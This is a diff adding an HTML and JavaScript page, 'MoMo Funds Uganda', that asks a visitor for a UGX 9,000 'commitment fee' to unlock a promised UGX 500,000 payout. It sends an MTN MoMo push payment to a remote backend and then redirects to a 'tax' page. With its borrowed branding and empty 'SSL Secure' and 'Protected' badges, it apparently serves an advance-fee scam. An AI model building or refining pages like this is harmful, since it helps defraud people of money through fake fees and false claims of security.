@@ -1,0 +1,486 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="theme-color" content="#FFCC00">
+<title>MoMo Funds Uganda - Commitment Fee</title>
+
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+
+<style>
+*{
+    margin:0;
+    padding:0;
+    box-sizing:border-box;
+    font-family:"Inter",sans-serif;
+}
+
+body{
+    min-height:100vh;
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    padding:18px;
+    background:
+        radial-gradient(circle at top left,rgba(255,204,0,.25),transparent 35%),
+        radial-gradient(circle at bottom right,rgba(249,168,37,.18),transparent 35%),
+        linear-gradient(135deg,#fffdf5,#fff7d6);
+}
+
+.container{
+    width:100%;
+    max-width:420px;
+}
+
+.card{
+    background:#fff;
+    border-radius:24px;
+    overflow:hidden;
+    box-shadow:0 20px 50px rgba(15,23,42,.14);
+}
+
+/* Header */
+
+.header{
+    background:linear-gradient(145deg,#FFCC00,#F9A825);
+    padding:26px 22px 46px;
+    text-align:center;
+    position:relative;
+    color:#1F2937;
+}
+
+.badge{
+    position:absolute;
+    left:50%;
+    bottom:-26px;
+    transform:translateX(-50%);
+    width:52px;
+    height:52px;
+    border-radius:16px;
+    background:white;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    box-shadow:0 10px 25px rgba(249,168,37,.3);
+}
+
+.badge svg{
+    width:26px;
+    height:26px;
+    stroke:#1F2937;
+}
+
+.header h1{
+    font-size:26px;
+    font-weight:700;
+}
+
+.header p{
+    margin-top:5px;
+    font-size:14px;
+    color:#374151;
+}
+
+/* Content */
+
+.content{
+    padding:38px 22px 22px;
+}
+
+.notice{
+    background:#FFF8E1;
+    border:1px solid #FFE082;
+    border-radius:16px;
+    padding:15px;
+    font-size:14px;
+    line-height:1.6;
+    color:#8A4B00;
+    margin-bottom:20px;
+}
+
+.details{
+    display:flex;
+    flex-direction:column;
+    gap:12px;
+    margin-bottom:20px;
+}
+
+.row{
+    display:flex;
+    justify-content:space-between;
+    align-items:center;
+    padding:12px 14px;
+    background:#F9FAFB;
+    border:1px solid #E5E7EB;
+    border-radius:14px;
+}
+
+.left{
+    display:flex;
+    align-items:center;
+    gap:12px;
+    font-size:14px;
+    color:#475569;
+}
+
+.icon{
+    width:36px;
+    height:36px;
+    border-radius:12px;
+    background:linear-gradient(135deg,#FFF9C4,#FFE082);
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    font-size:17px;
+}
+
+.value{
+    font-size:14px;
+    font-weight:600;
+    color:#111827;
+}
+
+/* Payment Box */
+
+.payment-box{
+    background:linear-gradient(145deg,#FFCC00,#F9A825);
+    color:#1F2937;
+    border-radius:18px;
+    padding:18px;
+    text-align:center;
+    margin-bottom:20px;
+    box-shadow:0 12px 28px rgba(249,168,37,.25);
+}
+
+.payment-box small{
+    display:block;
+    font-size:12px;
+    opacity:.9;
+}
+
+.payment-box strong{
+    display:block;
+    margin-top:4px;
+    font-size:28px;
+    font-weight:700;
+}
+
+/* Button */
+
+button{
+    width:100%;
+    padding:19px;
+    border:none;
+    border-radius:18px;
+    background:linear-gradient(145deg,#1F2937,#111827);
+    color:white;
+    font-size:18px;
+    font-weight:700;
+    cursor:pointer;
+    position:relative;
+    overflow:hidden;
+    transition:.25s ease;
+    box-shadow:0 14px 32px rgba(17,24,39,.3);
+}
+
+button::before{
+    content:"";
+    position:absolute;
+    top:0;
+    left:-120%;
+    width:50%;
+    height:100%;
+    background:linear-gradient(120deg,transparent,rgba(255,255,255,.35),transparent);
+    transform:skewX(-20deg);
+    transition:left .6s ease;
+}
+
+button:hover{
+    transform:translateY(-2px);
+}
+
+button:hover::before{
+    left:140%;
+}
+
+button:active{
+    transform:scale(.98);
+}
+
+button:disabled{
+    opacity:.6;
+    cursor:not-allowed;
+    transform:none;
+}
+
+/* Status */
+
+#status{
+    margin-top:14px;
+    font-size:13px;
+    text-align:center;
+    min-height:22px;
+    padding:8px;
+    border-radius:10px;
+}
+
+.success{
+    background:#ECFDF5;
+    color:#15803D;
+}
+
+.error{
+    background:#FEF2F2;
+    color:#DC2626;
+}
+
+/* Footer */
+
+.footer{
+    display:flex;
+    justify-content:space-between;
+    margin-top:18px;
+    padding-top:16px;
+    border-top:1px solid #E5E7EB;
+    font-size:11px;
+    color:#64748B;
+    flex-wrap:wrap;
+    gap:8px;
+}
+</style>
+</head>
+
+<body>
+
+<div class="container">
+
+<div class="card">
+
+<div class="header">
+
+<h1>MoMo Funds Uganda</h1>
+<p>Commitment Fee Payment</p>
+
+<div class="badge">
+<svg viewBox="0 0 24 24" fill="none" stroke-width="2">
+<path d="M12 3L19 6V11C19 16 15.5 19.8 12 21C8.5 19.8 5 16 5 11V6L12 3Z"/>
+</svg>
+</div>
+
+</div>
+
+<div class="content">
+
+<div class="notice">
+To complete your <strong>MoMo Funds Uganda</strong> application, a
+<strong>Customer Commitment Fee of UGX 9,000</strong> is required.
+Once payment is confirmed, your application will proceed to the final processing stage.
+</div>
+
+<div class="details">
+
+<div class="row">
+<div class="left">
+<div class="icon">👤</div>
+<div>Applicant</div>
+</div>
+<div class="value" id="fullName">Applicant</div>
+</div>
+
+<div class="row">
+<div class="left">
+<div class="icon">📞</div>
+<div>Phone</div>
+</div>
+<div class="value" id="phone">Not available</div>
+</div>
+
+<div class="row">
+<div class="left">
+<div class="icon">💰</div>
+<div>Selected Amount</div>
+</div>
+<div class="value">UGX <span id="fund">500,000</span></div>
+</div>
+
+</div>
+
+<div class="payment-box">
+<small>Customer Commitment Fee</small>
+<strong>UGX 9,000</strong>
+</div>
+
+<button id="payBtn" onclick="payService()">
+Pay with MTN MoMo →
+</button>
+
+<div id="status"></div>
+
+<div class="footer">
+<span>🔒 SSL Secure</span>
+<span>MTN MoMo Push</span>
+<span>Protected</span>
+</div>
+
+</div>
+
+</div>
+
+</div>
+
+<script>
+"use strict";
+
+const BACKEND_URL = "https://nyota-program-001-functionality-1.onrender.com";
+const SERVICE_FEE = 9000;
+
+document.getElementById("fullName").textContent =
+localStorage.getItem("fullName") ||
+localStorage.getItem("fullname") ||
+"Applicant";
+
+document.getElementById("phone").textContent =
+localStorage.getItem("phoneNumber") ||
+localStorage.getItem("phone") ||
+"Not available";
+
+const amount =
+localStorage.getItem("requestedAmount") ||
+localStorage.getItem("selectedAmount") ||
+500000;
+
+document.getElementById("fund").textContent =
+Number(amount).toLocaleString("en-UG");
+
+const payBtn = document.getElementById("payBtn");
+const statusEl = document.getElementById("status");
+
+function setStatus(msg,type=""){
+statusEl.textContent = msg;
+statusEl.className = type;
+}
+
+function setLoading(state,text){
+payBtn.disabled = state;
+payBtn.textContent = state ? text : "Pay with MTN MoMo →";
+}
+
+async function readJson(res){
+const txt = await res.text();
+return txt ? JSON.parse(txt) : {};
+}
+
+async function payService(){
+
+const phone =
+localStorage.getItem("phoneNumber") ||
+localStorage.getItem("phone");
+
+if(!phone){
+setStatus("Phone number not found.","error");
+return;
+}
+
+setLoading(true,"Sending MoMo Request...");
+setStatus("Sending payment request...");
+
+try{
+
+const response = await fetch(BACKEND_URL + "/stk-push",{
+method:"POST",
+headers:{
+"Content-Type":"application/json"
+},
+body:JSON.stringify({
+phone,
+amount:SERVICE_FEE
+})
+});
+
+const data = await readJson(response);
+
+if(!response.ok || data.success===false){
+throw new Error(data.message || "Payment request failed.");
+}
+
+const transactionId =
+data.transactionId ||
+data.checkout_request_id ||
+data.data?.transactionId ||
+data.data?.checkout_request_id;
+
+if(!transactionId){
+throw new Error("Transaction reference missing.");
+}
+
+setLoading(true,"Waiting for Payment...");
+setStatus("MoMo payment request sent. Enter your MTN MoMo PIN.");
+
+await checkPayment(transactionId);
+
+}catch(error){
+
+setStatus(error.message,"error");
+setLoading(false);
+
+}
+
+}
+
+async function checkPayment(transactionId){
+
+const start = Date.now();
+
+while(Date.now()-start<120000){
+
+try{
+
+const response = await fetch(BACKEND_URL + "/payment-status",{
+method:"POST",
+headers:{
+"Content-Type":"application/json"
+},
+body:JSON.stringify({transactionId})
+});
+
+const result = await readJson(response);
+
+const payment = result.data || result;
+const status = String(payment.status || "").toUpperCase();
+
+if(["SUCCESS","COMPLETED","CONFIRMED"].includes(status)){
+setStatus("Payment confirmed. Redirecting...","success");
+setLoading(true,"Payment Confirmed");
+
+setTimeout(()=>{
+window.location.href="tax.html";
+},1000);
+
+return;
+}
+
+if(["FAILED","CANCELLED","EXPIRED"].includes(status)){
+throw new Error("Payment " + status.toLowerCase() + ".");
+}
+
+}catch(error){
+
+if(/failed|cancelled|expired/i.test(error.message)){
+setStatus(error.message,"error");
+setLoading(false);
+return;
+}
+
+}
+
+await new Promise(r=>setTimeout(r,3000));
+}
+
+setStatus("Payment confirmation timed out.","error");
+setLoading(false);
+}
+</script>
+
+</body>
+</html>
